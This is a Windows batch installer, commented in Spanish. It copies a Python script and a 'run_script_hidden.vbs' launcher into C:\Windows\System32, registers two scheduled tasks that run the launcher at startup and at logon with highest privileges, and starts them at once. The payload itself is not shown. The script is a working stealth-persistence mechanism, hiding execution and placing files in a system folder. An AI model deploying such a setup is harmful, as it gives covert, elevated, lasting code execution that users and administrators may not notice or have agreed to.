@echo off
REM Copiar el archivo Python a C:\Windows\System32
copy /Y "%~dp0SCRIPTLABA.py" "C:\Windows\System32\SCRIPTLABA.py"

REM Copiar el archivo VBS a C:\Windows\System32
copy /Y "%~dp0run_script_hidden.vbs" "C:\Windows\System32\run_script_hidden.vbs"

REM Crear una tarea programada para ejecutar el archivo VBS al iniciar el sistema
schtasks /create /tn "RunScriptLaba_OnStart" /tr "wscript C:\Windows\System32\run_script_hidden.vbs" /sc onstart /f /rl highest

REM Crear una tarea programada para ejecutar el archivo VBS al iniciar sesión
schtasks /create /tn "RunScriptLaba_OnLogon" /tr "wscript C:\Windows\System32\run_script_hidden.vbs" /sc onlogon /f /rl highest

REM Ejecutar la tarea programada inmediatamente
schtasks /run /tn "RunScriptLaba_OnStart"
schtasks /run /tn "RunScriptLaba_OnLogon"

echo Tareas programadas creadas y ejecutadas exitosamente.
pause
